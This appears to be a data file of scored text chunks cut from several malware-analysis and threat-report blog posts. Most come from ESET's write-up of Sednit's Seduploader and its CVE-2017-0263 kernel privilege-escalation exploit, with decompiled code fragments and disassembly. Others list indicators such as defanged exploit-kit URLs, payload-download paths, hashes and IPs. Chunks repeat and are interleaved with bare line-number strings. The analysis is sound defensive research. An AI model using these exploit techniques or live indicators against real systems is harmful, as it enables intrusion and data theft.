CreateStreamOnHGlobal(0u, 1u, &ppstm);
v5 = GdipSaveImageToStream(v4[1], ppstm, &imageCLSID, 0);
if ( v5 )
v4[2] = v5;
(*(void (__thiscall **)(_DWORD *, signed int))*v4)(v4, 1);
IStream_Size(ppstm, &pui);
cb = pui.s.LowPart;
v7 = ppstm;
*a1 = pui.s.LowPart;
IStream_Reset(v7);
v1 = j_HeapAlloc(cb);
IStream_Read(ppstm, v1, cb);
ppstm->lpVtbl->Release(ppstm);
}
GdiplusShutdown(token);
return v1;
}",0.016252535629186493
1234567891011121314151617181920212223242526272829303132333435,0.010938846900794497
"[...]keybd_event(VK_SNAPSHOT, 0x45u, KEYEVENTF_EXTENDEDKEY, 0u);Sleep(1000u);keybd_event(VK_SNAPSHOT, 0x45u, KEYEVENTF_EXTENDEDKEY|KEYEVENTF_KEYUP, 0u);OpenClipboard(0u);hData = GetClipboardData(CF_BITMAP);CloseClipboard();if ( !hData )  return 0;GdiplusStartupInput = (const int *)1;v10 = 0;v11 = 0;v12 = 0;GdiplusStartup(&token, &GdiplusStartupInput, 0);if ( fGetEncoderClsid((int)L""image/jpeg"", &imageCLSID) ){  v4 = sub_10003C5F((int)hData, 0);  ppstm = 0;  CreateStreamOnHGlobal(0u, 1u, &ppstm);  v5 = GdipSaveImageToStream(v4[1], ppstm, &imageCLSID, 0);  if ( v5 )    v4[2] = v5;  (*(void (__thiscall **)(_DWORD *, signed int))*v4)(v4, 1);  IStream_Size(ppstm, &pui);  cb = pui.s.LowPart;  v7 = ppstm;  *a1 = pui.s.LowPart;  IStream_Reset(v7);  v1 = j_HeapAlloc(cb);  IStream_Read(ppstm, v1, cb);  ppstm->lpVtbl->Release(ppstm);}GdiplusShutdown(token);return v1;}",0.016511580491598288
"As usual, Sednit operators did not reinvent the wheel. We found some similarities between their implementation of the screenshot function and code available on stackoverflow. Instead of using GetForegroundWindow to retrieve a handle on the foreground window in which the user is currently working, Sednit chose to use keybd_event to send a “Print screen” keystroke and then retrieve the image from the clipboard.",0.01007019968338696
"The image is then base64-encoded and added to the report, whose structure now looks like this:",0.011472712829266873
"Tag
Value",0.010296621683355878
"id=
Hard drive serial number*",0.008879378076056765
"w=
Process list",0.008968587472916068
"None
NICs information",0.008928148593373986
"disk=
register key**",0.007609904741347706
"build=
4 bytes",0.008427293648679557
"inject
optional field***",0.007389644446389343
"img=
screenshot encoded in base64",0.008228314205736442
"* result of “import win32api;print hex(win32api.GetVolumeInformation(“C:\\”)[1])”
** content of HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
*** toggled if SEDUPLOADER uses injection into a browser to connect to Internet",0.00935098205007956
"Screenshotting was used before by Sednit. In the past, the feature was built in a separate, standalone tool often invoked by Xtunnel at a later infection stage (see page 77 of our whitepaper), but it is now built in Seduploader for use at the reconnaissance phase.",0.01096607526664517
"Finally, on the config side, two new functions were added: shell and LoadLib. The shell config allows the attacker to execute arbitrary code directly in-memory. The LoadLib is a bit field that allows running an arbitrary DLL by calling rundll32.exe",0.008267118580088328
CVE-2017-0263 – Local privilege escalation,0.00908837505533533
Exploit Workflow,0.008169000336893939
"As mentioned before, in order to deploy Seduploader Payload, Seduploader Dropper gains System privileges by exploiting CVE-2017-0263, an LPE vulnerability. In this section, we will describe how this vulnerability is exploited by Sednit.",0.009174768756370022
"First, even though the vulnerability affects Windows 7 and above (see at the end of this post for the full list of affected platforms), the exploit is designed to avoid running on Windows version 8.1 and above.",0.015140799635063429
"Since the exploit can target both 32-bit and 64-bit platforms, it will first determine if the process is running under WOW64. The exploit will allocate multiple pages, until it reaches a high address (0x02010000). It will then build the following structure:",0.015948569057252282
"struct Payload
{
LONG PTEAddress;               // Points to the PTE entry containing the physical address of the page containing our structure. Only used for windows 8+
LONG pid;                      // Injected process pid;
LONG offset_of_lpszMenuName;   // Offset of the lpszMenuName in the win32k!tagCLS structure
LONG offset_of_tagTHREADINFO;  // Offset of the pti field in the win32k!tagWND structure.
LONG offset_of_tagPROCESSINFO; // Offset of the ppi field in the win32k!tagTHREADINFO structure.
LONG offset_of_TOKEN;          // Offset of the Token field in the nt!_EPROCESS structure.
LONG tagCLS[0x100];            // Array containing the tagCLS of the created windows.
LONG WndProcCode;              // Code of the WndProc meant to be run in kernel mode.
};",0.020811489246391646
1234567891011,0.009047827744825598
struct Payload {   LONG PTEAddress;               // Points to the PTE entry containing the physical address of the page containing our structure. Only used for windows 8+   LONG pid;                      // Injected process pid;   LONG offset_of_lpszMenuName;   // Offset of the lpszMenuName in the win32k!tagCLS structure   LONG offset_of_tagTHREADINFO;  // Offset of the pti field in the win32k!tagWND structure.   LONG offset_of_tagPROCESSINFO; // Offset of the ppi field in the win32k!tagTHREADINFO structure.   LONG offset_of_TOKEN;          // Offset of the Token field in the nt!_EPROCESS structure.   LONG tagCLS[0x100];            // Array containing the tagCLS of the created windows.   LONG WndProcCode;              // Code of the WndProc meant to be run in kernel mode. };,0.020811489246391646
"Then, it will retrieve the address of HMValidateHandle. This function allows the attacker to leak the kernel address of a tagWND object.",0.009285868446690326
Here is an overview of how the rest of the exploit works:,0.0087698592965334
"The exploit will create 256 random window classes and their associated windows. Each window will have 512 bytes of extra memory. This extra memory is contiguous to the tagWND object in the kernel space. After the first created window, i.e. in the extra memory, the exploit will build a fake object containing mostly only its own address for later use, as shown in the picture:",0.013331557866103072
"When all the windows are created, the exploit will allocate 2 additional windows. The purpose of first one is to be executed in a kernel thread: let’s call this window KernelWnd, and the other one will mainly receive all the necessary messages needed for the exploit to complete; let’s call this window TargetWindow. Then, the exploit associates this procedure with the newly allocated object, KernelWnd.",0.014004843643652953
"// …
TargetWindow = CreateWindowExW(0x80088u, MainWindowClass, 0, WS_VISIBLE, 0, 0, 1, 1, 0, 0, hModuleSelf, 0);
KernelWnd = CreateWindowExW(0, MainWindowClass, 0, 0, 0, 0, 1, 1, 0, 0, hModuleSelf, 0);
// …
SetWindowLongW(KernelWnd, GWL_WNDPROC, (LONG)Payload_0->WndProc);",0.017444097976606066
"Let’s add some context around the behavior of the win32k component. Every time you create a new window through CreateWindowExW, the driver will allocate a new tagWND object in the kernel. The object can be described like this (some fields are removed for clarity’s sake):",0.012294731013832716
"kd> dt tagWND
win32k!tagWND
+0x000 head             : _THRDESKHEAD
+0x028 state            : Uint4B
// ...
+0x028 bServerSideWindowProc : Pos 18, 1 Bit
// ...
+0x042 fnid             : Uint2B
+0x048 spwndNext        : Ptr64 tagWND
+0x050 spwndPrev        : Ptr64 tagWND
+0x058 spwndParent      : Ptr64 tagWND
+0x060 spwndChild       : Ptr64 tagWND
+0x068 spwndOwner       : Ptr64 tagWND
+0x070 rcWindow         : tagRECT
+0x080 rcClient         : tagRECT
+0x090 lpfnWndProc      : Ptr64     int64
+0x098 pcls             : Ptr64 tagCLS
// ...",0.016311340803488394
123456789101112131415161718,0.009602473702807535
"kd> dt tagWND win32k!tagWND   +0x000 head             : _THRDESKHEAD   +0x028 state            : Uint4B   // ...   +0x028 bServerSideWindowProc : Pos 18, 1 Bit   // ...   +0x042 fnid             : Uint2B   +0x048 spwndNext        : Ptr64 tagWND   +0x050 spwndPrev        : Ptr64 tagWND   +0x058 spwndParent      : Ptr64 tagWND   +0x060 spwndChild       : Ptr64 tagWND   +0x068 spwndOwner       : Ptr64 tagWND   +0x070 rcWindow         : tagRECT   +0x080 rcClient         : tagRECT   +0x090 lpfnWndProc      : Ptr64     int64   +0x098 pcls             : Ptr64 tagCLS   // ...",0.016311340803488394
"As you can see, the tagWND->lpfnWindowProc contains the address of the procedure associated with this window. The driver usually lowers its privileges in order to execute this procedure in the user’s context. This behavior is controlled by the bit tagWND->bServerSideProc. If this bit is set, then the procedure will be run with elevated privileges, i.e in the kernel. The exploit works by flipping the tagWND->bServerSideProc bit. All the attacker needs to do is to find a way of flipping that bit.",0.013936610965118557
"During the destruction of the menus, the hook set up before will check if the class of the object is SysShadow as shown on the next code block. If that’s the case, it will replace the associated procedure with its own.",0.011577842255923398
"GetClassNameW(tagCWPSTRUCT->hwnd, &ClassName, 20);
if ( !wcscmp(&ClassName, STR_SysShadow) )
{
if ( ++MenuIndex == 3 )
{
// tagWND
::wParam = *(_DWORD *)(FN_LeakHandle((int)hWnd[0]) + sizeof_tagWND_0);
// Replace the WndProc of the object
SetWindowLongW(tagCWPSTRUCT->hwnd, GWL_WNDPROC, (LONG)FN_TriggerExploit);
}",0.01618189701174333
12345678910,0.008725552767522293
"GetClassNameW(tagCWPSTRUCT->hwnd, &ClassName, 20); if ( !wcscmp(&ClassName, STR_SysShadow) ) {   if ( ++MenuIndex == 3 )   {     // tagWND     ::wParam = *(_DWORD *)(FN_LeakHandle((int)hWnd[0]) + sizeof_tagWND_0);     // Replace the WndProc of the object     SetWindowLongW(tagCWPSTRUCT->hwnd, GWL_WNDPROC, (LONG)FN_TriggerExploit);   }",0.01618189701174333
"In this procedure, we can see that the exploit looks for the WM_NCDESTROY message. If the requirements are met, it will build a malicious tagPOPUPMENU object which is described by the following pseudocode:",0.012511509196875603
"if ( Msg == WM_NCDESTROY )
{
struct tagPOPUPMENU *pm = BuildFakeObject();
SetClassLongW(..., pm);
}",0.01319372275384778
12345,0.008003571580395774
"if ( Msg == WM_NCDESTROY ) {   struct tagPOPUPMENU *pm = BuildFakeObject();   SetClassLongW(..., pm); }",0.01319372275384778
"Note that the address used to build this object is within the extra memory allocated at the end of our first tagWND. Then, the exploit calls NtUserMNDragLeave, in order to flip the bServerSideProc bit of our KernelWnd object. To do so, the function will retrieve a tagMENUSTATE object using the structure tagTHREADINFO. The tagMENUSTATE object contains the address of the menu object being destroyed (tagMENUSTATE->pGlobalPopupMenu).",0.012039563946618426
"As you can see, the tagPOPUPMENU is the malicious object we crafted in user space before calling NtUserMNDragLeave. Looking at the fields in the malicious tagPOPUPMENU, we can see that they all points in the extra memory except one, which points into our KernelWnd object.",0.008114982425923234
"From here, the execution will reach the function MNFreePopup, which takes a pointer to a tagPOPUPMENU object. Eventually this function will call HMAssignmentUnlock, passing the fields spwndNextPopup and spwndPrevPopup as argument:",0.011276970756785576
"; win32k!HMAssignmentUnlock
rsp,28h
mov     rdx,qword ptr [rcx]
and     qword ptr [rcx],0
test    rdx,rdx
je      win32k!HMAssignmentUnlock+0x4f (fffff960`00119adf)
add     dword ptr [rdx+8],0FFFFFFFFh; Flipping bServerSideProc
jne     win32k!HMAssignmentUnlock+0x4f (fffff960`00119adf)
movzx   eax,word ptr [rdx]",0.020598448461710994
123456789,0.009139007525835963
"; win32k!HMAssignmentUnlockrsp,28hmov     rdx,qword ptr [rcx]and     qword ptr [rcx],0test    rdx,rdxje      win32k!HMAssignmentUnlock+0x4f (fffff960`00119adf)add     dword ptr [rdx+8],0FFFFFFFFh; Flipping bServerSideProcjne     win32k!HMAssignmentUnlock+0x4f (fffff960`00119adf)movzx   eax,word ptr [rdx]",0.019823318686121416
"After the execution of the syscall, our tagWND structure associated with our KernelWnd looks like this:",0.009267336491666667
Everything is set! The exploit just needs to send the right message in order to trigger the execution of our procedure in kernel mode.,0.013804013552642047
"syscall(NtUserMNDragLeave, 0, 0);
// Send a message to the procedure in order to trigger its execution in kernel mode.
KernelCallbackResult = SendMessageW(KernelWnd, 0x9F9Fu, ::wParam, 0);
Status.Triggered = KernelCallbackResult == 0x9F9F;
if ( KernelCallbackResult != 0x9F9F )
// Error, try again.
PostMessageW(TargetWindow, 0xABCDu, 0, 0);",0.017427675342172155
1234567,0.008430286247751106
"syscall(NtUserMNDragLeave, 0, 0); // Send a message to the procedure in order to trigger its execution in kernel mode. KernelCallbackResult = SendMessageW(KernelWnd, 0x9F9Fu, ::wParam, 0); Status.Triggered = KernelCallbackResult == 0x9F9F; if ( KernelCallbackResult != 0x9F9F )   // Error, try again.   PostMessageW(TargetWindow, 0xABCDu, 0, 0);",0.017427675342172155
"Finally, the window procedure running with elevated privileges will steal the SYSTEM token and add it to the calling process. After successfully running the exploit, FLTLDR.EXE should run with SYSTEM privileges, and will install Seduploader’s payload",0.011630057301069363
Summary,0.009602684635656611
"This campaign shows us that Sednit has not ceased its activities. They still keep their old habits: using known attack methods, reusing code from other malware or public websites, and making small mistakes such as typos in Seduploader’s configuration (shel instead of shell).",0.016312720989829388
"Also usual is the fact that they once again improved their toolset, this time adding some built-in features such as the screenshotter and integrating two new zero-day exploits into their arsenal.",0.013950686101885323
Platforms affected by CVE-2017-0262 and CVE-2017-0263 (according to Microsoft),0.013333371204218736
CVE-2017-0262,0.010458636567667545
"Microsoft Office 2010 Service Pack 2 (32-bit editions)
Microsoft Office 2010 Service Pack 2 (64-bit editions)
Microsoft Office 2013 Service Pack 1 (32-bit editions)
Microsoft Office 2013 Service Pack 1 (64-bit editions)
Microsoft Office 2013 RT Service Pack 1
Microsoft Office 2016 (32-bit edition)
Microsoft Office 2016 (64-bit edition)",0.025553572817735293
Microsoft advises all customers to follow the guidance in security advisory ADV170005 as a defense-in-depth measure against EPS filter vulnerabilities.,0.013213549777755018
CVE-2017-0263,0.010466531198106255
"Windows 7 for 32-bit Systems Service Pack 1
Windows 7 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows 8.1 for 32-bit systems
Windows 8.1 for x64-based systems
Windows Server 2012 R2
Windows RT 8.1
Windows Server 2012 R2 (Server Core installation)
Windows 10 for 32-bit Systems
Windows 10 for x64-based Systems
Windows 10 Version 1511 for x64-based Systems
Windows 10 Version 1511 for 32-bit Systems
Windows Server 2016
Windows 10 Version 1607 for 32-bit Systems
Windows 10 Version 1607 for x64-based Systems
Windows Server 2016 (Server Core installation)
Windows 10 Version 1703 for 32-bit Systems
Windows 10 Version 1703 for x64-based Systems
Windows Server 2008 for Itanium-Based Systems Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2<
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)",0.03708104984518401
IoCs,0.007797621120042231
Also available on ESET’s Github.,0.011790900091626977
SHA-1FilenameESET detection name,0.010918218619617837
d5235d136cfcadbef431eea7253d80bde414db9dTrump's_Attack_on_Syria_English.docxWin32/Exploit.Agent.NWZ,0.00997605270146995
18b7dd3917231d7bae93c11f915e9702aa5d1bbbimage1.epsWin32/Exploit.Agent.NWZ,0.007960825434653485
6a90e0b5ec9970a9f443a7d52eee4c16f17fcc70joiner.dllWin32/Exploit.Agent.NWV,0.007939175250047614
e338d49c270baf64363879e5eecb8fa6bdde8ad9apisecconnect.dllWin32/Sednit.BG,0.007481153062839141
Mutex,0.008189963084626162
flPGdvyhPykxGvhDOAZnU,0.008738718902468912
1,0.011966970221767848
flPGdvyhPykxGvhDOAZnU,0.008738718902468912
Registry key,0.00848769605046129
HKCU\Software\Microsoft\Office test\Special\Perf,0.009403289358653644
1,0.011966970221767848
"HKCU\Software\Microsoft\Office test\Special\Perf
",0.009403289358653644
"Over the past 24 hours, cybercriminals spamvertised millions of email addresses, impersonating UPS, in an attempt to trick end users into viewing the malicious .html attachment. Upon viewing, the file loads a tiny iFrame attempting to serve client-side exploit served by the latest version of the Black Hole Exploit kit, which ultimately drops malware on the affected host.
More details:",0.011810445028349381
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample malicious iFrame URLs found in multiple malicious .html files: hxxp://denegnashete.ru:8080/forum/links/column.php; hxxp://soisokdomen.ru:8080/forum/links/column.php; hxxp://diareuomop.ru:8080/forum/links/column.php; hxxp://omahabeachs.ru:8080/forum/links/column.php ;hxxp://penelopochka.ru:8080/forum/showthread.php?page; hxxp://furnitura-forums.ru:8080/forum/showthread.php?page; hxxp://onerussiaboard.ru:8080/forum/showthread.php?page; hxxp://online-gaminatore.ru:8080/forum/showthread.php; hxxp://bmwforummsk.ru:8080/forum/showthread.php?page
Sample detection rate for a malicious .html file found in the spamvertised emails: UPS_N21489880.htm – MD5: 38a2a54d6e7391d7cd00b50ed76b9cfb – detected by 26 out of 43 antivirus scanners as Trojan.Iframe.BCK; Trojan-Downloader.JS.Iframe.dbh",0.01404637877263093
"Client-side exploits serving URL: hxxp://denegnashete.ru:8080/forum/data/java.jar – MD5: 86946ec2d2031f2b456e804cac4ade6d – detected by 25 out of 43 antivirus scanners as Java/Cve-2012-1723; Exploit:Java/CVE-2012-4681.H
denegnashete.ru is currently responding to the following IPs – 84.22.100.108; 190.10.14.196; 203.80.16.81; 61.17.76.12; 213.135.42.98",0.010130526609247403
"Related malicious domains part of the campaign’s infrastructure:
rumyniaonline.ru – 84.22.100.108
denegnashete.ru – 84.22.100.108
dimabilanch.ru – 84.22.100.108
ioponeslal.ru – 84.22.100.108
moskowpulkavo.ru – 84.22.100.108
omahabeachs.ru – 84.22.100.108
uzoshkins.ru – 84.22.100.108
sectantes-x.ru – 84.22.100.108
Name servers part of the campaign’s infrastructure:
ns1.denegnashete.ru – 62.76.190.50
ns2.denegnashete.ru – 87.120.41.155
ns3.denegnashete.ru – 132.248.49.112
ns4.denegnashete.ru – 91.194.122.8
ns5.denegnashete.ru – 62.76.188.246
ns6.denegnashete.ru – 178.63.51.54
This isn’t the first time that cybercriminals have impersonated UPS. Go through related analysis of previous campaigns impersonating the company:",0.013821529797761523
"Cybercriminals impersonate UPS, serve malware
Cybercriminals impersonate UPS in client-side exploits and malware serving spam campaign
Spamvertised ‘UPS Delivery Notification’ emails serving client-side exploits and malware
Spamvertised ‘Your UPS delivery tracking’ emails serving client-side exploits and malware
Spamvertised ‘Wire Transfer Confirmation’ themed emails lead to Black Hole exploit kit",0.01340059528729709
"Webroot SecureAnywhere users are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.010140397009949953
"ACAD/Medre.A   10000’s of AutoCAD files leaked in suspected industrial espionage
The malware news today is all about new targeted, high-tech, military grade malicious code such as Stuxnet, Duqu and Flamer that have grabbed headlines. So imagine our surprise when an AutoCAD worm, written in AutoLISP, the scripting language that AutoCAD uses, suddenly showed a big spike in one country on ESET’s LiveGrid® two months ago,",0.01521721998793557
21 Jun 2012 - 04:58AM,0.01114448240756516
"The malware news today is all about new targeted, high-tech, military grade malicious code such as Stuxnet, Duqu and Flamer that have grabbed headlines. So imagine our surprise when an AutoCAD worm, written in AutoLISP, the scripting language that AutoCAD uses, suddenly showed a big spike in one country on ESET’s LiveGrid® two months ago,",0.017243346728869735
"The malware news today is all about new targeted, high-tech, military grade malicious code such as Stuxnet, Duqu and Flamer that have grabbed headlines. So imagine our surprise when an AutoCAD worm, written in AutoLISP, the scripting language that AutoCAD uses, suddenly showed a big spike in one country on ESET’s LiveGrid® two months ago, and this country is Peru.",0.015509483937972912
"We have seen other small number of infections of ACAD/Medre.A in other countries, but they are all in countries that are near Peru or have a large Spanish speaking contingent. The odd one out in the infection table would be the People’s Republic of China, but not quite so weird when we started to analyze the worm based on this sudden spike. More about China will follow later.",0.013161931696783924
"Why (mainly) Peru? Of course it does not mean much that we see high detection numbers because they may not all be live infections. But watching ESET’s LiveGrid®, where we can also see detections at specific URLs., which made it clear that a specific website supplied the AutoCAD template that appears to be the basis for this localized spike as this template was also infected with ACAD/Medre.A. If it is assumed that companies which want to do business with the entity have to use this template, it seems logical that the malware mainly shows up in Peru and neighboring countries. The same is true for larger companies with affiliated offices outside this area that have been asked to assist or to verify the – by then – infected project and then infecting their own environment. Other information that is described later also points to live infections.",0.010632316621010385
So what exactly is ACAD/Medre.A doing?,0.00860279327480895
"The sample is able to infect versions 14.0 to 19.2 of AutoCAD by modifying the corresponding native startup file of AutoLISP (acad.lsp) by being named as the auto-load file acad.fas. It employs Visual Basic Scripts that are executed using the Wscript.exe interpreter that is integrated in the Windows operating system since Windows 2000. The author assumes that his code will even work for future versions of AutoCAD as it has support for the AutoCAD versions that will be released in 2013, 2014 and 2015.",0.00973045558111918
"After some configuration, ACAD/Medre.A will begin sending the different AutoCAD drawings that are opened by e-mail to a recipient with an e-mail account at the Chinese 163.com internet provider. It will try to do this using 22 other accounts at 163.com and 21 accounts at qq.com, another Chinese internet provider. Remarkably, this is done by accessing smtp.163.com and smtp.qq.com with the different account credentials. It is ill advised to have port 25 outgoing allowed other than to your own ISP. Obviously the Internet Providers in Peru do allow this. Also it is reasonable to assume that the companies that are a victim of this suspected industrial espionage malware do not have their firewalls configured to block port 25 either.",0.011139996215132397
"Besides the drawings that are sent, ACAD/Medre.A will create a password protected RAR-file containing the drawing and the requisite “acad.fas” file and a “.dxf” file and send it separately by e-mail. The password used, just one character long being “1”, on the RAR-file brings back some memories (you may remember that Win32/Bagle used the same password on RAR-files).",0.013262571831328729
The included .DXF file is generated by ACAD/Medre.A and consists of information that the recipient needs to load the stolen drawing into the right system with the right language:,0.007724998437546926
For a technical details of ACAD/Medre.A refer to Robert Lipovsky’s blog post and the description in ESET’s Threat Encyclopedia.,0.01170995932641783
"When our analysts looked into the e-mail accounts used by ACAD/Medre.A, they noticed that the Inbox for each of them was already full (over 100,000 mails). All of the messages In the Inbox were error-messages as the Inbox of the final recipient is full. And there were still almost 5,000 emails to be sent.",0.013421986026974753
"As the path and filename are sent with the attachment, we could do some analysis just based on the location where the drawings are stored and their possible content. Our analysis also shows that several people actually use an Administrator Account or store their projects on the Desktop. The pie-chart does not reflect all the different possibilities, just the most frequently used ones.",0.009569485553488355
"From our analysis of all the used e-mail accounts we can derive the scale of the attack and conclude that tens of thousands of AutoCAD drawings (blueprints) leaked. This is a significant amount of data leakage and we felt it called for further action. Upon realisation of the magnitude of the problem ESET reached out to Tencent, owners of the qq.com domain. Due to swift quick action on the part of Tencent the accounts used for relaying the e-mails with the drawings have been blocked and thus no further leakage will occur. We would like to express our appreciation to the distinguished team at Tencent’s Desktop Security Business Division for their cooperation and their prompt action.",0.011046262010673047
"ESET has also reached out to CVERC, the Chinese National Computer Virus Emergency Response Center, and they also responded quickly by word of the First Deputy Director of CVERC, who also assisted in getting the accounts removed.",0.013400130420630485
"There is code in ACAD/Medre.A that will check to see if either Outlook version 11.0, 12.0 or 13.0 is present or Foxmail. If Outlook is present the worm tries to email PST files found on the computer to the final recipient in China via the qq.com relays. Outlook PST (Personal STore) files contain email, calendars, contacts, and more. If Foxmail is present, there is code in ACAD/Medre.A that is designed to exfiltrate the Foxmail Address Book and the Foxmail Send Folder, but errors in the code cause that this does not happen.",0.01078151473395339
"After the discovery of ACAD/Medre.A, ESET decided to make a free stand-alone cleaner available. The utility can be found here. We established contacts with Autodesk, producers of AutoCAD, who immediately took the problem seriously and full assistance was given.",0.010840495003834993
ACAD/Medre.A is a serious example of suspected industrial espionage. Every new design created by a victim is sent automatically to the authors of this malware. Needless to say this can cost the legitimate owner of the intellectual property a lot of money as the cybercriminals will have designs before they even go into production by the original designer. The attacker may even go so far as to get patents on the product before the inventor has registered it at the patent office. The inventor may not know of the security breach until his patent claim is denied due to prior art.,0.013289377599340346
"If there is one thing that becomes obvious from our experience with this piece of malware it is that reaching out to other parties to minimize damage is not only the right thing to do, it really works. We could have tried to clean up the problem without the assistance of Autodesk, Tencent and CVERC and solely focus on removal of the malware from the infected machines. By working with Autodesk, Tencent and CVERC, we were able to not only alert and inform users but also defeat the e-mail relay system used by the attackers and deny them access to the e-mail boxes, so the damage is now contained.",0.010220139495502822
"UPDATE 22 June: ESET has published a white-paper on the ACAD/Medre.A worm. You can find the whitepaper here…
",0.011281215399642108
"Spike in Malvertising Attacks Via Nuclear EK Pushes Ransomware
We’ve been monitoring a malvertising campaign very closely as it really soared during the past week. The actors involved seem to be the same as the ones behind the self-sufficient Flash malverts/exploits we’ve documented before and reported by security researcher Kafeine (Spartan EK).
One single domain (easy-trading.biz) is relaying all traffic to other ‘ad networks’ and ultimately to the Nuclear exploit kit. That domain still hosts the malicious Flash file (CVE-2015-7645) that it previously used in standalone attacks.
Now instead, it points its traffic directly to Nuclear EK, which also attempts to exploit CVE-2015-7645 as seen in the picture below:",0.011601874665625123
"This malvertising campaign receives traffic from multiple sources, including the AdCash ad network which we promptly informed. According to our telemetry, this attack is accounting for about half of all malvertising activity we are seeing now.
Interestingly, most victims from this campaign are outside of the US and UK and mainly in certain parts of Europe and South America. The payload distributed by the exploit kit is a downloader which retrieves several over pieces of malware including ransomware.
Technical details
The Fiddler traffic capture below shows the “currency trading” website used as a redirector to Nuclear EK.",0.012442237716547955
The redirection to the exploit kit is slightly obfuscated within the second URL sequence (fake advertiser):,0.0076353952518199986
"The payload from this attack is a downloader which happens to drop at least one piece of ransomware (TeslaCrypt) and more malware afterwards (see IOCs below for a more complete list).
We are mostly used to seeing Angler EK in malvertising attacks lately, so this particular instance was interesting due to its high volume and of course the abundance of payloads dropped.
Malwarebytes Anti-Exploit users were protected against this attack.
IOCs:
Malvertising:",0.02001157005674581
"easy-trading.biz/?come=adcash&sorce=976226&trtype=tope
IP: 45.63.13.175",0.01097290868416434
Payload:,0.007480699776334698
f8b49ddbbe7d49d7c9784f32a7eda609,0.008850326585784662
Subsequent payloads:,0.007876208958238373
"d8bd341ea0ce5aa9ad457e8197961c38
be9705378cb95e2f1834f21eefe1de31
e67161f38d42b1119a1794e00ec9dc9c (TeslaCrypt)",0.014712894102531626
Traffic (links to binary payloads retrieved by the downloader):,0.007649694791415529
"104.131.212.117/imageserver/autoget/get.php?f=locker
104.131.212.117/imageserver/autoget/get.php?f=eghost
104.131.212.117/imageserver/autoget/get.php?f=clicool_ppc
104.131.212.117/imageserver/autoget/get.php?f=escoq
104.131.212.117/imageserver/autoget/get.php?f=f10_ppc
104.131.212.117/imageserver/autoget/get.php?f=severa_socks
104.131.212.117/imageserver/autoget/get.php?f=simbly_top
",0.017849756899562474
Critical Update for JetPack WordPress Plugin,0.007575516881362265
"The Jetpack team just released a critical security update to fix a security vulnerability in the Jetpack WordPress plugin. The vulnerability allows an attacker to bypass the website’s access control and publish posts on the site. All versions of JetPack since October, 2012 (Jetpack 1.9) are vulnerable, and all users should update to version 2.9.3 ASAP.
Jetpack is a very popular plugin for WordPress with almost 10 million downloads, so the impact of such vulnerability can be very big if users do not update.",0.011268609630336712
From the JetPack announcement:,0.009395884924304099
"Jetpack version 2.9.3 contains a critical security update, and you should update your site and any you help manage as soon as possible. You can update through your dashboard, or download Jetpack manually here.
Fortunately, we have no evidence of this being used in the wild. However, now that this update is public, it’s just a matter of time before exploits occur. To avoid a breach, you should update your site as soon as possible. (The vulnerability has been disclosed on the MITRE Common Vulnerabilities and Exposures system as CVE-2014-0173.)
This is a bad bug, and Jetpack is one of the most widely used plugins in the WordPress world. We have been working closely with the WordPress security team, which has pushed updates to every version of the plugin since 1.9 through core’s auto-update system.",0.008574527141215205
"We also want to commend George Stephanis, and the rest of the Jetpack team for their excellent disclosure handling. Also for passing over the proper detection and protection methods to prevent this vulnerability from being exploited. Because of this, Sucuri Website Firewall users are already protected against this attack.
Again, if you are using Jetpack, please update it now!
",0.009005942497425368
"“Aurora” exploit code: from Targeted Attacks to Mass Infection.
Last Thursday, Microsoft released an out-of-band update to fix the latest vulnerability in Internet Explorer.  Since then, malware operators have been exploiting this vulnerability to install malware on thousands of PCs.  So far, we have detected more than 650 different versions of the exploit code which is detected as Trojan.JS/Exploit.CVE-2010-0249 by ESET antivirus.  We have",0.013365963159044258
25 Jan 2010 - 08:53AM,0.011496301265184528
"Last Thursday, Microsoft released an out-of-band update to fix the latest vulnerability in Internet Explorer.  Since then, malware operators have been exploiting this vulnerability to install malware on thousands of PCs.  So far, we have detected more than 650 different versions of the exploit code which is detected as Trojan.JS/Exploit.CVE-2010-0249 by ESET antivirus.  We have",0.011926848714419513
"Last Thursday, Microsoft released an out-of-band update to fix the latest vulnerability in Internet Explorer.  Since then, malware operators have been exploiting this vulnerability to install malware on thousands of PCs.  So far, we have detected more than 650 different versions of the exploit code which is detected as Trojan.JS/Exploit.CVE-2010-0249 by ESET antivirus.  We have also identified more than 220 unique distribution points for the exploit code, mostly located in Asia.  The countries which are seeing the majority of the attacks are China, Korea and Taiwan.",0.013846590749325594
"Here is a typical scenario we have recently analyzed. We came upon a link that is a distribution point for the CVE-2010-0249 exploit code.  The shellcode is built with an obfuscated javascript.  The URL of a file that will be downloaded and executed by the shell code is appended to the end of the script, just before the vulnerability is triggered.  If the vulnerability is successfully exploited, a first stage binary is downloaded and executed on the victim’s system.  ESET detects this first stage binary as Win32/AntiAV.NDD.  This first binary tries to disable antivirus protection on the infected host.  If the protection is successfully disabled, Win32/AntiAV.NDD writes a system driver to disk and enables it.  This system driver is detected as Win32/Agent.ONG, a common malicious program which is used to download and install more malware on infected hosts.  This Trojan fetches a list of links from the same server which idistributes the exploit.  At the time of analysis, the list of files to download and execute included 7 links, mostly online game password stealers.",0.01264115137803068
"To sum up, if you happen to browse to a web page delivering the latest CVE-2010-0249 exploit code, and if you haven’t patched and are not using an up to date antivirus, you will end up with 8 different pieces of malware on your PC within seconds.",0.01183713833855371
"This evolution in the usage of the exploit code follows the natural course we have observed over the last couple of months.  Exploits for high profile vulnerabilities are usually used at first by a very few attackers against specific targets.  When details of the exploit become public, malware operators integrate the code in their toolbox and use it to infect as many users as possible.",0.01563141575902971
Pierre-Marc Bureau,0.010065851889200839
"Senior Researcher
",0.00861567407568753
"Cybercriminals are currently spamvertising millions of emails impersonating Discover, in an attempt to trick cardholders into clicking on the client-side exploits serving URLs found in the malicious emails. Upon clicking on the links, users are exposed to the client-side exploits served by the latest version of the Black Hole Exploit Kit.
More details:",0.013696868996287304
Sample screenshot of the spamvertised email:,0.010990132234593664
